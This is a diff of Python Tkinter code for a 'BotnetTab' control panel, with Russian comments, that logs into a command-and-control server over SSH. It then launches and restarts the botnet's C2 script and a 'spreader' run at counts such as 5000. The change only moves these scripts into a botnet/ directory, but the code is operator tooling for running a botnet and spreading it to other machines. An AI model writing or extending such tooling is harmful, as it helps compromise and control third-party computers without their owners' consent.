@@ -322,7 +322,8 @@ class BotnetTab(ttk.Frame):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
-                cmd = f"cd /root/c2 && python3 -u spreader.py --count {count}"
+                # Путь к спредеру из botnet/
+                cmd = f"cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
                 stdin, stdout, stderr = client.exec_command(cmd)
                 for line in iter(stdout.readline, ""):
                     self.spread_log.insert(tk.END, line)
@@ -351,8 +352,11 @@ class BotnetTab(ttk.Frame):
                 out = stdout.read().decode()
                 err = stderr.read().decode()
                 self.spread_log.insert(tk.END, out + "\n" + err + "\n")
-                # перезапуск C2 и спредера
-                restart_cmd = "cd /root/c2 && pkill -f c2.py; pkill -f spreader.py; nohup python3 c2.py > c2.log 2>&1 & nohup python3 -u spreader.py --count 5000 >> spreader.log 2>&1 &"
+                # перезапуск C2 (из botnet/) и спредера
+                restart_cmd = ("cd /root/c2 && pkill -f c2.py; pkill -f spreader.py; "
+                               "nohup python3 botnet/c2.py > c2.log 2>&1 & "
+                               "sleep 2; "
+                               "nohup python3 -u botnet/spreader.py --count 5000 >> spreader.log 2>&1 &")
                 stdin, stdout, stderr = client.exec_command(restart_cmd)
                 self.spread_log.insert(tk.END, "[+] VPS обновлён и перезапущен\n")
                 client.close()
